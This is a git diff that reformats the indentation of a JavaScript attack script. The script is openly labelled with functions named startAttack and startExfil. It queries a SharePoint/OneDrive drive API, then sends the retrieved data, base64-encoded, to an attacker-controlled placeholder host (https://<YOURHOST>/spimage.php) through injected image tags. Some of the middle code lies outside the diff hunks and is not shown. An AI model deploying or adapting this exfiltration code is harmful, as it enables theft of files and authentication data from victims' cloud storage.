@@ -1,9 +1,9 @@
-	function getDriveId(data) {
-        d = JSON.parse(data);
+function getDriveId(data) {
+	d = JSON.parse(data);
         return d.parentReference.driveId;
-    }
+}
 
-    function startAttack() {
+function startAttack() {
         var t = "/_api/v2.1/drive/items/root";
         var xmlhttp = new XMLHttpRequest();
         xmlhttp.open("GET", t);
@@ -16,9 +16,9 @@
             }
         };
         xmlhttp.send();
-    }
+}
 
-    function startExfil(t, driveId) {
+function startExfil(t, driveId) {
         var xmlhttp = new XMLHttpRequest();
         xmlhttp.open("GET", t);
         xmlhttp.onreadystatechange = function () {
@@ -39,16 +39,18 @@
             }
         }
         xmlhttp.send();
-    }
+}
 
-    function imgadd(u) {
+function imgadd(u) {
         var img = document.createElement('img');
         img.src = u;
         document.getElementById('imagehome').appendChild(img);
         down.innerHTML = "&nbsp;";
-    }
+}
 
-    function corslite(data,nm){
-	    imgadd("https://<YOURHOST>/spimage.php?name="+encodeURIComponent(nm)+"&auth_url="+btoa(data));
-    }
-    startAttack();
+function corslite(data,nm){
+	imgadd("https://<YOURHOST>/spimage.php?name="+encodeURIComponent(nm)+"&auth_url="+btoa(data));
+}
+
+startAttack();
+
